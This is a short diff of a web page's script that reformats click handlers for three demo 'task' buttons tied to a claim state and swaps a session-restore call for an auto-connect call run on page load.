-        task1Btn.addEventListener("click", function(){
+      if (task1Btn) {
+        task1Btn.addEventListener("click", function () {
           task1Done = true;
-          markTaskState(task1CheckEl, true, "Task 1 completed (demo)", "Not completed");
+          markTaskState(
+            task1CheckEl,
+            true,
+            "Task 1 completed (demo)",
+            "Not completed"
+          );
           updateClaimState();
         });
       }
 
-      if(task2CheckBtn){
+      if (task2CheckBtn) {
         task2CheckBtn.addEventListener("click", handleTask2Check);
       }
 
-      if(task3Btn){
-        task3Btn.addEventListener("click", function(){
+      if (task3Btn) {
+        task3Btn.addEventListener("click", function () {
           task3Done = true;
-          markTaskState(task3CheckEl, true, "Task 3 completed (demo)", "Not completed");
+          markTaskState(
+            task3CheckEl,
+            true,
+            "Task 3 completed (demo)",
+            "Not completed"
+          );
           updateClaimState();
         });
       }
 
+      await autoConnectOnLoad();
       const yearEl = document.getElementById("year");
-      if(yearEl) yearEl.textContent = new Date().getFullYear();
-
-      const restored = await hydrateFromExistingAccount();
-      if(!restored){
-        clearSessionUI();
-      }
+      if (yearEl) yearEl.textContent = new Date().getFullYear();
     });
-  </script>
+  })();
+</script>
+
 </body>
 </html>
